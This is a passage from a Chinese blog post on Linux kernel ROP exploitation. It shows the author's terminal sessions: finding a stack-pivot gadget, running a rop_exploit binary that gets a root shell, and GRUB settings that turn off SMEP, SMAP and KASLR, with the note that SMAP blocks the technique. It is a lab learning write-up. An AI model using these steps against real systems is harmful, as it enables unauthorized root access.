+<p>可惜最后在我的系统上没试验成功，不知道啥原因~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ dmesg | grep ops</div><div class="line">[ 8933.372862] addr(ops) = ffffffffa035a340</div><div class="line"></div><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ ./find_offset.py ffffffffa035a340 gadgets </div><div class="line">offset = 18446744073644211981</div><div class="line">gadget:  0xffffffff810d9ba8 : xchg eax, esp ; ret 0x14ff</div><div class="line"></div><div class="line">stack addr = 810d9ba8</div><div class="line"></div><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ ./rop_exploit 18446744073644211981 ffffffffa035a340</div><div class="line">array base address = 0xffffffffa035a340</div><div class="line">stack address = 0x810d9ba8</div><div class="line">Killed</div></pre></td></tr></table></figure></p>
+<p>后来过了发现是smap的原因，关了smap就可以了。因为kernel stack被转移到用户空间，所以当访问stack上的数据时会触发内核page fault。不过这次我是在ubuntu 12.04.5上做的实验，刚开始也是失败了，后来关了smap后就成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">to disable smep/smap/kaslr in linux:</div><div class="line">add &apos;nosmep/nosmap/nokaslr&apos; here: GRUB_CMDLINE_LINUX=&quot;nosmep/nosmap/nokaslr&quot; in /etc/default/grub, then update-grub2.</div></pre></td></tr></table></figure></p>
+<p>smap确实是被关闭了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">w0lfzhang@w0lfzhang-666:~$ cat /proc/cpuinfo | grep smap</div><div class="line">w0lfzhang@w0lfzhang-666:~$</div></pre></td></tr></table></figure></p>
+<p>然后我们执行exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">w0lfzhang@w0lfzhang-666:~/Desktop/kernel_rop$ ./rop_exploit 18446744073644207075 ffffffffa0318340</div><div class="line">array base address = 0xffffffffa0318340</div><div class="line">stack address = 0x8108e258</div><div class="line"># id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div><div class="line">#</div></pre></td></tr></table></figure></p>
+<p>所以说，如果在内核态执行用户空间的rop chain在smap开启了是行不通的，gg~</p>
+<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1" target="_blank" rel="external">Linux Kernel ROP - Ropping your way to # (Part 1)</a>/)<br><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2" target="_blank" rel="external">Linux Kernel ROP - Ropping your way to # (Part 2)</a>/)<br><a href="http://www.freebuf.com/articles/system/135402.html" target="_blank" rel="external">Linux内核ROP姿势详解（二）</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/kernel-rop/" rel="tag">#kernel rop</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/03/Linux-Slab-Allocator/" rel="next" title="Linux Slab Allocator">
+                <i class="fa fa-chevron-left"></i> Linux Slab Allocator
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/09/Debugging-Linux-Loadable-Kernel-Module/" rel="prev" title="Debugging Linux Loadable Kernel Module">
+                Debugging Linux Loadable Kernel Module <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">54</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">87</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://y0ung.tech" title="y0ung" target="_blank">y0ung</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Intro"><span class="nav-number">1.</span> <span class="nav-text">Intro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example"><span class="nav-number">2.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Links"><span class="nav-number">3.</span> <span class="nav-text">Links</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/08/06/Linux-Kernel-ROP/';
+      var disqus_title = "Linux Kernel ROP";
+      var disqus_url = 'http://yoursite.com/2017/08/06/Linux-Kernel-ROP/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
